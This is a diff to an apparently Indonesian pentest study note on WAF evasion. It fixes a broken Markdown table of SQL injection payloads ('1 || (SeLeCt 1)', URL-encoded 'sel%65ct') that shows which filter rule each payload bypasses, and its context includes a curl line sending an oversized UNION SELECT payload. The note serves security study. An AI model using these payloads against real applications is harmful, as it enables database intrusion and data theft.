@@ -25,7 +25,6 @@ cssclasses:
 ---
 
 ## Daftar Isi
-
 - [[#1. Regex Reversing]]
 - [[#2. URL & Encoding Obfuscation]]
 - [[#3. HTTP Protocol Evasion]]
@@ -55,14 +54,14 @@ Bypass: 1 || (SeLeCt 1)  # Case toggling? Cek...
 
 ### Progression Table
 
-| Iteration | Payload    | Status  | Rule Discovered       |
-| --------- | ---------- | ------- | --------------------- |
-| 1         | `1 OR 1=1` | BLOCKED | `or` keyword          |
-| 2         | `1         |         | 1`                    | ALLOWED | `                     |     | ` ok |
-| 3         | `1         |         | (select 1 from dual)` | BLOCKED | `select` keyword      |
-| 4         | `1         |         | (SeLeCt 1)`           | ALLOWED | Case sensitive filter |
-| 5         | `1         |         | (select/**/1)`        | BLOCKED | Comment `/**/`        |
-| 6         | `1         |         | (sel%65ct 1)`         | ALLOWED | URL encoding bypass   |
+| Iteration | Payload | Status | Rule Discovered |
+|---|---|---|---|
+| 1 | `1 OR 1=1` | BLOCKED | `or` keyword |
+| 2 | `1 || 1` | ALLOWED | `||` ok |
+| 3 | `1 || (select 1 from dual)` | BLOCKED | `select` keyword |
+| 4 | `1 || (SeLeCt 1)` | ALLOWED | Case sensitive filter |
+| 5 | `1 || (select/**/1)` | BLOCKED | Comment `/**/` |
+| 6 | `1 || (sel%65ct 1)` | ALLOWED | URL encoding bypass |
 
 ---
 
@@ -239,7 +238,6 @@ curl -d "data=$(python -c "print('A'*100000 + ' UNION SELECT...")" http://target
 **Sumber utama:** Awesome-WAF `/mnt/data_d/Projects/Reference/Awesome-WAF/` (evasion section, 70+ teknik)
 
 **Cross-link vault:**
-
 - [[waf-reverse-proxy-deepdive]] — arsitektur WAF
 - [[sql-comment-injection-waf-bypass]] — SQL comment injection case study
 - [[waf-ebpf-xdp-pentest]] — kernel level testing
